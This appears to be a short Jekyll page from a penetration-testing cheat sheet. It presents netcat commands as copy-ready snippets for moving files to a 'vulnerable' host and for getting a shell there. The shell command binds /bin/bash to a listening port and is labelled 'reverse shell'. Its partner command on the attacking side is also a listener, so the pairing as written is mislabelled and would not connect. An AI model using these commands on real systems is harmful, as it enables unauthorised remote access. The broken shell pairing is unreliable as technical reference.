---
layout: topics
page-title: Netcat
receive-file: nc -l 1499 > filename.out
send-file: nc $VULN_IP 1499 < filename.in
listen-for-connection: nc -n -v -l -p 5555 -e /bin/bash
connect: nc -lvnp 5555
---

{% include copy-code-blocks.html text='Transfer file from attacking to vulnerable (run on vulnerable): ' language='bash' code=page.receive-file %}
{% include copy-code-blocks.html text='Transfer file from attacking to vulnerable (run on attacking): ' language='bash' code=page.send-file %}
{% include copy-code-blocks.html text='Reverse shell (run on vulnerable): ' language='bash' code=page.listen-for-connection %}
{% include copy-code-blocks.html text='Reverse shell (run on attacking): ' language='bash' code=page.connect %}
